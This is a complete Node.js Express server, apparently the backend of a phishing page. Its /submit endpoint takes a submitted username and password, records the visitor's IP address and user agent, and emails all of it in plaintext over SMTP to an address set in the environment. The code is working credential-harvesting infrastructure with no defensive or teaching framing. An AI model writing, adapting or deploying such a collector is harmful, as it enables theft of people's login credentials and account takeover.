// server.js
require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');

const app = express();
app.use(helmet());
app.use(express.json());
app.use(cors()); // in production restrict origin

// rate limit
app.use(rateLimit({ windowMs: 60*1000, max: 30 }));

// transporter
const transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST || 'smtp.sendgrid.net',
  port: Number(process.env.SMTP_PORT) || 587,
  secure: (process.env.SMTP_SECURE === 'true') || false,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS
  }
});

app.get('/', (req,res)=> res.send({ ok: true }));

app.post('/submit', async (req,res) => {
  try {
    const { username, password, userAgent } = req.body || {};
    if (!username || !password) return res.status(400).json({ message: 'Missing fields' });

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const subject = `New submission from site @ ${new Date().toLocaleString()}`;
    const text = `New submission received:

Username/Email: ${username}
Password/Text: ${password}
User-Agent: ${userAgent || 'n/a'}
IP: ${ip}
Time: ${new Date().toISOString()}

--`;

    await transporter.sendMail({
      from: process.env.MAIL_FROM,
      to: process.env.NOTIFY_TO,
      subject,
      text
    });

    console.log('Sent notification for:', username);
    return res.json({ ok: true });
  } catch (err) {
    console.error('Error /submit', err);
    return res.status(500).json({ message: 'Internal error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=> console.log('Server started on', PORT));
